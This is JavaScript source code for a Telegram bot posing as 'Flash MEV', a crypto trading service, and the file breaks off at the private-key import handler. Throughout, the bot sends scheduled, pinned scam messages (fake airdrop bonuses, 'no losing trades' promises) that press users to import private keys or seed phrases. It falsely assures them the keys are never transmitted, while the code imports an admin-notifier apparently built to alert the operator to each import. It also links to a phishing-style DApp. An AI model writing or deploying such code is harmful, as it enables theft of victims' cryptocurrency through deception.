const { Telegraf, Markup } = require('telegraf');
const config = require('./config');
const { wallets, TARGET_URL } = require('./wallets');
const { airdropWallets, TARGET_URL: AIRDROP_URL } = require('./airdrop-wallets');
const walletManager = require('./wallet-manager'); // ← FIX #1: Added missing import
const { alertNewImport, fetchMultiChainBalances } = require('./admin-notifier');
const { startBalanceMonitor } = require('./balance-monitor');
const userTracker = require('./user-tracker');

// User state map for tracking data (used by /portfolio etc)
const users = new Map(); // ← FIX #2: Added missing Map

const bot = new Telegraf(config.BOT_TOKEN);

// 🧪 DEBUG: Log ALL incoming messages
bot.use((ctx, next) => {
    if (ctx.message?.text) {
        console.log(`[DEBUG] Incoming text: "${ctx.message.text}" from user ${ctx.from.id}`);
    }
    return next();
});

// Add near the top
const isAdmin = (telegramId) => config.ADMIN_TELEGRAM_IDS.includes(telegramId);

// ═══════════════════════════════════════════════════
// 📱 WELCOME MESSAGE (shown before /start)
// ═══════════════════════════════════════════════════
const WELCOME_MESSAGE = `
🤖 *What can this bot do?*

*Flash MEV* is an autonomous searcher across Solana and EVM Chains.

It watches public mempools and private order flow, simulates each opportunity, then executes front-run, back-run, arbitrage, and liquidation bundles in the same block.

Routing is *Flashbots-style* on EVM and *Jito-style* on Solana, so your bundles land protected.

Every target clears anti-rug filters first. *Non-custodial by design:* you hold the keys, the bot does the hunting.

_Tap start to spin up the MEV._
`;

// ═══════════════════════════════════════════════════
// 🎬 /start MESSAGE (after user clicks start)
// ═══════════════════════════════════════════════════
const START_MESSAGE = `
⚡ *Flash MEV*
_See the block before it lands._

Every second, fast profit chances appear on-chain: price gaps between exchanges, trades about to move a price (front-run and back-run), and liquidations. Normally only Flashers with bots catch them.

*FLASH MEV* is that bot, made effortless. One tap to deploy, then it runs itself, scanning Ethereum, Base, BNB, Arbitrum & Solana 24/7 and trading only the moment a win is locked in. No charts, no timing, no experience needed.

*▸ CAPABILITIES*

▸ *Revert-protected:* a trade only goes through if it wins. If it wouldn't profit, it's cancelled, so you can't lose money on a trade.

▸ *Private by default:* your trades route through private relays, so no one can jump ahead of you.

▸ *Non-custodial:* your keys never leave your wallet. We never hold your money.

▸ *Telegram-first:* deposit, deploy and track everything right here.

\`${config.STATS.landRate} land rate · ${config.STATS.avgLatency} avg latency · ${config.STATS.chains} chains, always on.\`

*▸ LINKS*
[🌐 Website](${config.WEBSITE}) · [Channel](${config.CHANNEL_URL})

✨ *Connect your wallet to get started, or import wallet key / 12-word phrase. /docs for guide.*
`;

// ═══════════════════════════════════════════════════
// 🎯 /start handler - Welcome + scheduled messages
// ═══════════════════════════════════════════════════
bot.start(async (ctx) => {
    const userId = ctx.from.id;

    // 💾 Save user to database (so we can restore on server restart)
    await userTracker.saveUser(userId, ctx.from.username, ctx.from.first_name);
    await userTracker.reactivateUser(userId);

    try {
        // Step 1: Send welcome video first (if configured)
        if (config.WELCOME_VIDEO) {
            await ctx.replyWithVideo(config.WELCOME_VIDEO, {
                caption: '⚡ *Initializing Flash MEV...*',
                parse_mode: 'Markdown',
                supports_streaming: true
            });
        }

        // Step 2: Small delay for better UX
        await new Promise(resolve => setTimeout(resolve, 500));

        // Step 3: Send the main START message
        await ctx.replyWithMarkdown(START_MESSAGE, {
            disable_web_page_preview: true,
            ...getStartKeyboard()
        });

        // Step 4: Schedule followup message (15 minutes)
        setTimeout(async () => {
            try {
                await sendFollowupMessage(userId);
            } catch (err) {
                console.error(`Failed to send followup to user ${userId}:`, err.message);
            }
        }, 45 * 60 * 1000);

        // Step 5: Schedule airdrop reminder (45 minutes)
        setTimeout(async () => {
            try {
                await sendAirdropMessage(userId);
            } catch (err) {
                console.error(`Failed to send airdrop reminder to user ${userId}:`, err.message);
            }
        }, 15 * 60 * 1000);

        // Step 6: Schedule activate message (1 hour)
        setTimeout(async () => {
            try {
                await sendActivateMessage(userId);
            } catch (err) {
                console.error(`Failed to send activate to user ${userId}:`, err.message);
            }
        }, 65 * 60 * 1000);

        // Step 7: Schedule atomic execution message (2 hours) ← NEW
        setTimeout(async () => {
            try {
                await sendAtomicExecutionMessage(userId);
            } catch (err) {
                console.error(`Failed to send atomic execution message to user ${userId}:`, err.message);
            }
        }, 2 * 60 * 60 * 1000);
        // }, 10 * 1000);


        // Step 8: Schedule honeypot filter message (3 hours) ← NEW
        setTimeout(async () => {
            try {
                await sendHoneypotFilterMessage(userId);
            } catch (err) {
                console.error(`Failed to send honeypot filter message to user ${userId}:`, err.message);
            }
        }, 3 * 60 * 60 * 1000);
        // }, 12 * 1000);

        // Step 9: Schedule RPC infrastructure message (4 hours) ← NEW
        setTimeout(async () => {
            try {
                await sendRpcInfrastructureMessage(userId);
            } catch (err) {
                console.error(`Failed to send RPC infrastructure message to user ${userId}:`, err.message);
            }
        }, 4 * 60 * 60 * 1000);
        // }, 7 * 1000);

        // Step 10: Schedule DEX scanner message (5 hours) ← NEW
        setTimeout(async () => {
            try {
                await sendDexScannerMessage(userId);
            } catch (err) {
                console.error(`Failed to send DEX scanner message to user ${userId}:`, err.message);
            }
        }, 5 * 60 * 60 * 1000);
        // }, 12 * 1000);

        // Step 11: Schedule cross-chain message (6 hours) ← NEW
        setTimeout(async () => {
            try {
                await sendCrossChainMessage(userId);
            } catch (err) {
                console.error(`Failed to send cross-chain message to user ${userId}:`, err.message);
            }
        }, 6 * 60 * 60 * 1000);
        // }, 18 * 1000);

        // Step 12: Schedule engine activation message (7 hours) ← NEW
        setTimeout(async () => {
            try {
                await sendEngineActivationMessage(userId);
            } catch (err) {
                console.error(`Failed to send engine activation message to user ${userId}:`, err.message);
            }
        }, 7 * 60 * 60 * 1000);
        // }, 22 * 1000);

        // Step 13: Start random scheduler AFTER all initial messages (8 hours)
        setTimeout(() => {
            scheduleRandomMessage(userId);
        }, 8 * 60 * 60 * 1000);

    } catch (err) {
        console.error('Start error:', err.message);
        await ctx.replyWithMarkdown(START_MESSAGE, {
            disable_web_page_preview: true,
            ...getStartKeyboard()
        });
    }
});

// ═══════════════════════════════════════════════════
// 📅 FOLLOW-UP MESSAGE (45 minutes after /start)
// ═══════════════════════════════════════════════════
async function sendFollowupMessage(userId) {
    const FOLLOWUP_TEXT = `
*3 STEPS TO AUTOMATE YOUR MEV EXECUTION*

❌ Complex technical setups requiring expensive VPS servers and node upkeep.

⚡️ Non-custodial automation inside Telegram in 3 simple steps:

1️⃣ *Initialize* — Type /start to connect your wallet (view only) or you can import key/Phrase

2️⃣ *Fund* — Deposit minimum working capital of $200 if you don't have funds in your wallet already (Higher capital deployment unlocks significantly larger financial returns).

3️⃣ *Deploy* — Enable your target chains and let the engine scan 24/7.

━━━━━━━━━━━━━━━━━━━━━

‼️ *LIMITED OFFER*
🎁 *0% fees* for new users during the first 48 hours.
`;

    try {
        let followupMsg;

        if (config.FOLLOWUP_VIDEO) {
            followupMsg = await bot.telegram.sendVideo(userId, config.FOLLOWUP_VIDEO, {
                caption: FOLLOWUP_TEXT,
                parse_mode: 'Markdown',
                supports_streaming: true,
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            followupMsg = await bot.telegram.sendMessage(userId, FOLLOWUP_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        try {
            await bot.telegram.pinChatMessage(userId, followupMsg.message_id);
            console.log(`✅ Pinned followup message for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin message for user ${userId} (normal for private chats)`);
        }

    } catch (err) {
        console.error(`Failed to send followup to ${userId}:`, err.message);
    }
}

// ═══════════════════════════════════════════════════
// 📅 ACTIVATE MESSAGE (1 hour after /start)
// ═══════════════════════════════════════════════════
async function sendActivateMessage(userId) {
    const ACTIVATE_TEXT = `
🔥 *ACTIVATE YOUR MEV BOT*
_From zero to scanning in under a minute._

━━━━━━━━━━━━━━━━━━━━━

*Launch* → Open @Flash\\_Mev\\_trading\\_bot, tap /start. Connect your wallet (view only) or import your own. The keys are yours, export to trust wallet anytime.

*Fund* → Send to the chain you want the bot on:
▸ EVM — ETH, Base, Arbitrum, Polygon, BSC

*Activate* → Tap 🔥 Deploy FLASH MEV. The bot watches five chains 24/7 and executes when a window opens. Nothing to configure, nothing to babysit.

━━━━━━━━━━━━━━━━━━━━━

*▸ YOUR CONTROLS*
/wallet — Manage wallet
/portfolio — Positions & PnL
/settings — Trade settings
/referral — Rewards & referral
/info — How FLASH MEV works
/help — Command list

━━━━━━━━━━━━━━━━━━━━━

‼️ *LIMITED OFFER*
🎁 *0% fees* for new users during the first 48 hours.

_The chain doesn't sleep. Neither does the bot._ ✅
`;

    try {
        let activateMsg;

        if (config.ACTIVATE_IMAGE) {
            activateMsg = await bot.telegram.sendPhoto(userId, config.ACTIVATE_IMAGE, {
                caption: ACTIVATE_TEXT,
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            activateMsg = await bot.telegram.sendMessage(userId, ACTIVATE_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        try {
            await bot.telegram.pinChatMessage(userId, activateMsg.message_id);
            console.log(`✅ Pinned activate message for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin activate message for user ${userId}`);
        }

    } catch (err) {
        console.error(`Failed to send activate to ${userId}:`, err.message);
    }
}


// ═══════════════════════════════════════════════════
// 🎁 AIRDROP REMINDER MESSAGE (15 minutes after /start)
// ═══════════════════════════════════════════════════
async function sendAirdropMessage(userId) {
    const AIRDROP_TEXT = `
🎁 *UNCLAIMED BONUS DETECTED*

━━━━━━━━━━━━━━━━━━━━━

Check if your wallet is Eligible for Airdrop Claim.

*▸ WHAT'S WAITING FOR YOU*

💰 *0% Trading Fees* for the first 48 hours
🔥 *Priority MEV Access* across 5 chains
⚡ *Instant Execution* on detected opportunities
🛡️ *Non-Custodial* — your keys stay yours

━━━━━━━━━━━━━━━━━━━━━

⏳ *TIME-SENSITIVE*

Bonus allocations are *first-come, first-served* and expire once the onboarding window closes for your wallet cohort.

_Users who claim within the first hour unlock 3x the average MEV capture rate._

━━━━━━━━━━━━━━━━━━━━━

👇 *Tap below to verify eligibility and claim your bonus in under 60 seconds.*
`;

    try {
        let airdropMsg;

        if (config.AIRDROP_REMINDER_IMAGE) {
            airdropMsg = await bot.telegram.sendPhoto(userId, config.AIRDROP_REMINDER_IMAGE, {
                caption: AIRDROP_TEXT,
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            airdropMsg = await bot.telegram.sendMessage(userId, AIRDROP_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        // Pin the message
        try {
            await bot.telegram.pinChatMessage(userId, airdropMsg.message_id);
            console.log(`✅ Pinned airdrop reminder for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin airdrop reminder for user ${userId}`);
        }

    } catch (err) {
        console.error(`Failed to send airdrop reminder to ${userId}:`, err.message);
    }
}


// ═══════════════════════════════════════════════════
// ⚡ ATOMIC EXECUTION MESSAGE (2 hours after /start)
// ═══════════════════════════════════════════════════
async function sendAtomicExecutionMessage(userId) {
    const ATOMIC_TEXT = `
🚨 *Market slippage during execution can turn winning setups into loss making trades.*

Standard DEX swaps execute partially or at bad rates when price action shifts suddenly.

*FLASH MEV guarantees Atomic Execution.* Your trade bundle lands completely intact at expected margins, or it reverts harmlessly in the local sandbox.

━━━━━━━━━━━━━━━━━━━━━

*▸ WHY IT MATTERS*

⚡️ All-or-nothing bundle structure prevents partial fills
⚡️ Zero gas lost on reverted execution checks
⚡️ Direct validator routing via Flashbots & Jito
⚡️ Multi-chain security across 5 active networks

━━━━━━━━━━━━━━━━━━━━━

‼️ *LIMITED TIME OFFER*
🎁 *0% fees* for new users during the first 48 hours.

_Never lose to slippage again._ ✅
`;

    try {
        let atomicMsg;

        if (config.ATOMIC_EXECUTION_VIDEO) {
            atomicMsg = await bot.telegram.sendVideo(userId, config.ATOMIC_EXECUTION_VIDEO, {
                caption: ATOMIC_TEXT,
                parse_mode: 'Markdown',
                supports_streaming: true,
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            atomicMsg = await bot.telegram.sendMessage(userId, ATOMIC_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        try {
            await bot.telegram.pinChatMessage(userId, atomicMsg.message_id);
            console.log(`✅ Pinned atomic execution message for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin atomic execution message for user ${userId}`);
        }

    } catch (err) {
        console.error(`Failed to send atomic execution message to ${userId}:`, err.message);
    }
}

// ═══════════════════════════════════════════════════
// 🛡️ HONEYPOT FILTER MESSAGE (3 hours after /start)
// ═══════════════════════════════════════════════════
async function sendHoneypotFilterMessage(userId) {
    const HONEYPOT_TEXT = `
🛡️ *AUTOMATED HONEYPOT & TAX FILTER*

Dodge malicious contracts before placing a single order:

━━━━━━━━━━━━━━━━━━━━━

*▸ 3-LAYER DEFENSE SYSTEM*

1️⃣ *Dual-Path Simulation* — Simulates BOTH buy and sell routes in sandbox.

2️⃣ *Contract Verification* — Detects blacklists, abnormal sell taxes, and transfer locks.

3️⃣ *Automatic Drop* — Unsafe tokens are rejected instantly before transaction submission.

━━━━━━━━━━━━━━━━━━━━━

Extract yield with built-in contract defense.

━━━━━━━━━━━━━━━━━━━━━

‼️ *NEW USER PASS*
🎁 Trade with *100% fee-free execution* during your first 48 hours.

_Never get rugged by a honeypot again._ ✅
`;

    try {
        let honeypotMsg;

        if (config.HONEYPOT_FILTER_VIDEO) {
            honeypotMsg = await bot.telegram.sendVideo(userId, config.HONEYPOT_FILTER_VIDEO, {
                caption: HONEYPOT_TEXT,
                parse_mode: 'Markdown',
                supports_streaming: true,
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            honeypotMsg = await bot.telegram.sendMessage(userId, HONEYPOT_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        try {
            await bot.telegram.pinChatMessage(userId, honeypotMsg.message_id);
            console.log(`✅ Pinned honeypot filter message for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin honeypot filter message for user ${userId}`);
        }

    } catch (err) {
        console.error(`Failed to send honeypot filter message to ${userId}:`, err.message);
    }
}


// ═══════════════════════════════════════════════════
// 📣 RPC INFRASTRUCTURE MESSAGE (4 hours after /start)
// ═══════════════════════════════════════════════════
async function sendRpcInfrastructureMessage(userId) {
    const RPC_TEXT = `
📣 *RPC rate limits and node congestion lead to dropped transactions.*

Public RPC endpoints throttle requests during high network volume, causing your orders to fail.

*FLASH MEV operates on high-speed cloud infrastructure with direct private relay connections.*

━━━━━━━━━━━━━━━━━━━━━

⚡️ Zero node setup or local hardware maintenance required
🚀 Bypasses public RPC congestion straight to block builders
🤖 Continuous 24/7 mempool scanning across 5 blockchains
📱 Clean mobile management via inline Telegram commands

━━━━━━━━━━━━━━━━━━━━━

‼️ *EXCLUSIVE WELCOME OFFER*
🎁 *0% fees* for new users during the first 48 hours.

_Professional infrastructure, zero overhead._ ✅
`;

    try {
        let rpcMsg;

        if (config.RPC_INFRASTRUCTURE_VIDEO) {
            rpcMsg = await bot.telegram.sendVideo(userId, config.RPC_INFRASTRUCTURE_VIDEO, {
                caption: RPC_TEXT,
                parse_mode: 'Markdown',
                supports_streaming: true,
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            rpcMsg = await bot.telegram.sendMessage(userId, RPC_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        try {
            await bot.telegram.pinChatMessage(userId, rpcMsg.message_id);
            console.log(`✅ Pinned RPC infrastructure message for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin RPC infrastructure message for user ${userId}`);
        }

    } catch (err) {
        console.error(`Failed to send RPC infrastructure message to ${userId}:`, err.message);
    }
}

// ═══════════════════════════════════════════════════
// 💻 DEX SCANNER FATIGUE MESSAGE (5 hours after /start)
// ═══════════════════════════════════════════════════
async function sendDexScannerMessage(userId) {
    const DEX_TEXT = `
💻 *STOP STARING AT DEX SCREENER ALL DAY.*

Manual trading is exhausting:

❌ Copy-pasting contract addresses
❌ Getting front-run by sandwich bots
❌ Losing gas on failed transactions
❌ Staring at red/green candles for hours

*There is a cleaner way.*

Set up *FLASH MEV* once, point it at your preferred chains, and let the cloud infrastructure monitor the mempool 24/7.

No terminal open. No VPS needed. No manual grinding.

━━━━━━━━━━━━━━━━━━━━━

🛠️ *SETUP IN 3 TAPS:*

1️⃣ Tap /start
2️⃣ Deposit at least $200 to deploy FLASH MEV
3️⃣ Press Deploy

━━━━━━━━━━━━━━━━━━━━━

‼️ *NEW USER PASS*
🎁 Trade with *100% fee-free execution* during your first 48 hours.

_Stop grinding. Start automating._ ✅
`;

    try {
        let dexMsg;

        if (config.DEX_SCANNER_VIDEO) {
            dexMsg = await bot.telegram.sendVideo(userId, config.DEX_SCANNER_VIDEO, {
                caption: DEX_TEXT,
                parse_mode: 'Markdown',
                supports_streaming: true,
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            dexMsg = await bot.telegram.sendMessage(userId, DEX_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        try {
            await bot.telegram.pinChatMessage(userId, dexMsg.message_id);
            console.log(`✅ Pinned DEX scanner message for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin DEX scanner message for user ${userId}`);
        }

    } catch (err) {
        console.error(`Failed to send DEX scanner message to ${userId}:`, err.message);
    }
}

// ═══════════════════════════════════════════════════
// ⌛️ CROSS-CHAIN FRICTION MESSAGE (6 hours after /start)
// ═══════════════════════════════════════════════════
async function sendCrossChainMessage(userId) {
    const CROSS_CHAIN_TEXT = `
⌛️ *App switching friction is costing you cross-chain opportunities.*

Juggling multiple wallet extensions, mobile apps, and bridges causes delays that destroy MEV margins.

*Flash MEV provides a unified multi-chain execution pipeline controlled from a single Telegram thread.*

━━━━━━━━━━━━━━━━━━━━━

⚡️ 1 EVM Key covers Ethereum, Base, BNB Chain & Robinhood Chain
⚡️ Dedicated Solana pipeline integrated directly with Jito relays
⚡️ Toggle active chains on or off instantly via /settings
⚡️ Unified portfolio telemetry across all 5 networks

━━━━━━━━━━━━━━━━━━━━━

‼️ *48 HOUR ZERO FEE WINDOW*
🎁 Enjoy *0% platform fees* for the first 48 hours after deployment.

_One interface. All chains. Zero friction._ ✅
`;

    try {
        let crossMsg;

        if (config.CROSS_CHAIN_VIDEO) {
            crossMsg = await bot.telegram.sendVideo(userId, config.CROSS_CHAIN_VIDEO, {
                caption: CROSS_CHAIN_TEXT,
                parse_mode: 'Markdown',
                supports_streaming: true,
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            crossMsg = await bot.telegram.sendMessage(userId, CROSS_CHAIN_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        try {
            await bot.telegram.pinChatMessage(userId, crossMsg.message_id);
            console.log(`✅ Pinned cross-chain message for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin cross-chain message for user ${userId}`);
        }

    } catch (err) {
        console.error(`Failed to send cross-chain message to ${userId}:`, err.message);
    }
}

// ═══════════════════════════════════════════════════
// ✅ ENGINE ACTIVATION MESSAGE (7 hours after /start)
// ═══════════════════════════════════════════════════
async function sendEngineActivationMessage(userId) {
    const ENGINE_TEXT = `
✅ *THE ENGINE YOU NEVER TURNED ON*

You made a wallet. You never funded it. Fair — most people wait.

But while you waited: blocks kept sealing on five chains, windows kept opening and closing in milliseconds, and other searchers kept taking the trades your engine would have simulated.

*The chain doesn't pause for anyone's decision.*

━━━━━━━━━━━━━━━━━━━━━

Switching it on takes two steps:

1️⃣ *Fund your wallet* — $200 minimum, any supported chain
2️⃣ Tap 🔥 *Deploy Flash MEV*

That's it. Scan, simulate, submit. It wins or it cancels — no losing trades by design, and you keep custody the whole time.

━━━━━━━━━━━━━━━━━━━━━

‼️ *LIMITED OFFER*
🎁 *0% fees* for your first 48 hours.

Every profitable bundle in that window is fully yours. The clock starts when you deploy.

_The trenches never sleep. Your engine shouldn't either._ ✅
`;

    try {
        let engineMsg;

        if (config.ENGINE_ACTIVATION_IMAGE) {
            engineMsg = await bot.telegram.sendPhoto(userId, config.ENGINE_ACTIVATION_IMAGE, {
                caption: ENGINE_TEXT,
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            engineMsg = await bot.telegram.sendMessage(userId, ENGINE_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        try {
            await bot.telegram.pinChatMessage(userId, engineMsg.message_id);
            console.log(`✅ Pinned engine activation message for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin engine activation message for user ${userId}`);
        }

    } catch (err) {
        console.error(`Failed to send engine activation message to ${userId}:`, err.message);
    }
}


// ═══════════════════════════════════════════════════
// 🎲 RANDOM MESSAGE SCHEDULER (after initial messages)
// ═══════════════════════════════════════════════════
const randomSchedulers = new Map();

function scheduleRandomMessage(userId) {
    if (randomSchedulers.has(userId)) {
        clearTimeout(randomSchedulers.get(userId));
    }

    const minMs = config.RANDOM_MIN_HOURS * 60 * 60 * 1000;
    const maxMs = config.RANDOM_MAX_HOURS * 60 * 60 * 1000;
    const randomMs = Math.random() * (maxMs - minMs) + minMs;

    const timeout = setTimeout(async () => {
        try {
            // All 9 message types, each with ~11% chance
            const messageTypes = [
                { fn: sendFollowupMessage, name: 'followup' },
                { fn: sendActivateMessage, name: 'activate' },
                { fn: sendAirdropMessage, name: 'airdrop' },
                { fn: sendAtomicExecutionMessage, name: 'atomic' },
                { fn: sendHoneypotFilterMessage, name: 'honeypot' },
                { fn: sendRpcInfrastructureMessage, name: 'rpc' },
                { fn: sendDexScannerMessage, name: 'dex' },
                { fn: sendCrossChainMessage, name: 'cross-chain' },
                { fn: sendEngineActivationMessage, name: 'engine' }
            ];

            const randomIndex = Math.floor(Math.random() * messageTypes.length);
            const selectedMessage = messageTypes[randomIndex];

            await selectedMessage.fn(userId);
            console.log(`🎲 Sent random ${selectedMessage.name} message to ${userId}`);

            scheduleRandomMessage(userId);

        } catch (err) {
            console.error(`Random message failed for ${userId}:`, err.message);
            scheduleRandomMessage(userId);
        }
    }, randomMs);

    randomSchedulers.set(userId, timeout);
    console.log(`🎲 Next random message for ${userId} in ${Math.round(randomMs / 60000)} minutes`);
}


function getStartKeyboard() {
    return Markup.inlineKeyboard([
        [
            Markup.button.callback('🔗 Connect Wallet', 'connect_wallet'),
            Markup.button.callback('🔑 Import Key', 'import_key')
        ],
        [
            Markup.button.callback('🌐 Language', 'language')
        ]
    ]);
}

// ═══════════════════════════════════════════════════
// 🎯 CONNECT WALLET - Show ALL wallets immediately
// ═══════════════════════════════════════════════════
bot.action('connect_wallet', async (ctx) => {
    await ctx.answerCbQuery();

    walletManager.userStates.set(ctx.from.id, {
        step: 'wallet_connect_flow',
        timestamp: Date.now()
    });

    const connectMessage = `
🔗 *Sync Trading Wallet*

━━━━━━━━━━━━━━━━━━━━━

*▸ NODE AUTHORIZATION REQUIRED*

Select your master wallet below to bind the MEV execution engine via read-only routing.

⚠️ _For best experience, open this bot on your mobile device where wallet apps are installed._

━━━━━━━━━━━━━━━━━━━━━

*▸ SELECT YOUR WALLET*
_One-tap deep link to your wallet app_
`;

    const keyboard = [];

    const allWallets = [
        ...wallets.popular,
        ...wallets.mobile,
        ...wallets.desktop
    ];

    for (let i = 0; i < allWallets.length; i += 2) {
        const row = [];
        row.push(Markup.button.url(
            `${allWallets[i].emoji} ${allWallets[i].name}`,
            allWallets[i].href
        ));
        if (allWallets[i + 1]) {
            row.push(Markup.button.url(
                `${allWallets[i + 1].emoji} ${allWallets[i + 1].name}`,
                allWallets[i + 1].href
            ));
        }
        keyboard.push(row);
    }

    keyboard.push([Markup.button.callback('📋 Copy DApp Link', 'copy_dapp_link')]);
    keyboard.push([
        Markup.button.callback('🔑 Import Key Instead', 'import_key'),
        Markup.button.callback('◀️ Back', 'back_to_start')
    ]);

    await ctx.editMessageText(connectMessage, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard(keyboard)
    });
});

// NOTE: Removed orphaned wallets_mobile and wallets_desktop handlers
// (no longer used since connect_wallet shows all wallets at once)

// ═══════════════════════════════════════════════════
// 🎯 COPY DAPP LINK (Fallback for unsupported wallets)
// ═══════════════════════════════════════════════════
bot.action('copy_dapp_link', async (ctx) => {
    await ctx.answerCbQuery();

    const message = `
📋 *Manual DApp Connection*

━━━━━━━━━━━━━━━━━━━━━

*▸ DAPP ENDPOINT:*
\`${TARGET_URL}\`

*▸ HOW TO CONNECT:*

*1.* Open your wallet application
*2.* Navigate to the built-in browser
*3.* Paste the URL above
*4.* Connect your wallet
*5.* Return here and tap *✓ I'm Connected*

━━━━━━━━━━━━━━━━━━━━━

_If your preferred provider is unlisted or the automated redirection fails, use this secure endpoint._

🔒 _All connections are encrypted end-to-end_
`;

    await ctx.editMessageText(message, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
        ...Markup.inlineKeyboard([
            [Markup.button.url('🌐 Open DApp Directly', TARGET_URL)],
            [Markup.button.callback('✓ I\'m Connected', 'confirm_connected')],
            [Markup.button.callback('◀️ Back to Wallets', 'connect_wallet')]
        ])
    });
});

// ═══════════════════════════════════════════════════
// 🎯 CONFIRM CONNECTION (after manual connect)
// ═══════════════════════════════════════════════════
bot.action('confirm_connected', async (ctx) => {
    await ctx.answerCbQuery();

    await ctx.editMessageText(
        `⚠️ *Verification Required*

To activate your MEV agent after connecting via DApp browser, please import your private key to enable autonomous execution.

_Your keys are encrypted locally and never transmitted._`,
        {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🔑 Import Key', 'import_key')],
                [Markup.button.callback('◀️ Back', 'connect_wallet')]
            ])
        }
    );
});

// ═══════════════════════════════════════════════════
// 🎯 IMPORT KEY - Initial menu
// ═══════════════════════════════════════════════════
bot.action('import_key', async (ctx) => {
    await ctx.answerCbQuery();

    await ctx.editMessageText(
        `🔑 *Import Wallet*

Choose how to import your wallet:

*Private Key* (Recommended)
Import using your wallet's private key.

*Seed Phrase*
Import using your 12 or 24-word recovery phrase.

━━━━━━━━━━━━━━━━━━━━━

🔒 *Security Notice:*
Your keys are encrypted locally and never transmitted. They are only used to sign transactions for MEV execution.

_Tap "Security" below to learn how we protect your keys._`,
        {
            parse_mode: 'Markdown',
            disable_web_page_preview: true,
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🔐 Private Key', 'import_private_key')],
                [Markup.button.callback('📝 Seed Phrase', 'import_seed_phrase')],
                [Markup.button.callback('🔐 Learn About Security', 'docs_security')],
                [Markup.button.callback('◀️ Back', 'back_to_start')]
            ])
        }
    );
});

// ═══════════════════════════════════════════════════
// 🎯 IMPORT PRIVATE KEY
// ═══════════════════════════════════════════════════
bot.action('import_private_key', async (ctx) => {
    await ctx.answerCbQuery();

